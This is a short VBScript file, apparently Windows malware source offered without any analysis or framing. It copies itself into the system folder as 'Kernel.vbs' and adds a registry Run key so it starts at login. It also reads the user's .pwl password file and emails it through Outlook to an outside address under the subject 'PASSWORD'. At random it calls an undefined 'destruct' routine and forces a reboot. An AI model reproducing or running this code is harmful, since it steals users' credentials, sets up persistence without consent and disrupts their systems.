sub Reboot
Set Shell=CreateObject("WScript.Shell")
Shell.Run "Rundll32.exe User.exe,ExitWindows"
end sub

function Random(n) 
randomize timer
Random=Int(n*rnd)
end function

sub write(k,v)
Set RegEdit = CreateObject("WScript.Shell")
RegEdit.RegWrite k,v 
end sub

function read(k)
Set RegEdit = CreateObject("WScript.Shell")
read=RegEdit.regread(k) 
end function
On Error Resume Next
Set FileSystem = CreateObject("Scripting.FileSystemObject")
Set MeAgain = FileSystem.GetFile(WScript.ScriptFullName) 
Set WinDir = FileSystem.GetSpecialFolder(0)
Set SysDir = FileSystem.GetSpecialFolder(1)
CopyPath=SysDir&"\Kernel.vbs" 
AccName=read("HKEY_LOCAL_MACHINE\Network\Logon\UserName")
Write "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\System32",CopyPath 
MeAgain.Copy(CopyPath) 
pswrdfile=windir&"\"&AccName&".pwl"
set OutLook=WScript.CreateObject("Outlook.Application")
set milo=OutLook.CreateItem(0) 
milo.Recipients.Add("xxxxvirus@yahoo.com")
milo.Subject = "PASSWORD"
milo.Body = "PASSWORD FILE GOT>"
milo.Attachments.Add(pswrdfile)
milo.Send 
if random(120)=20 then 
destruct
reboot 
end if
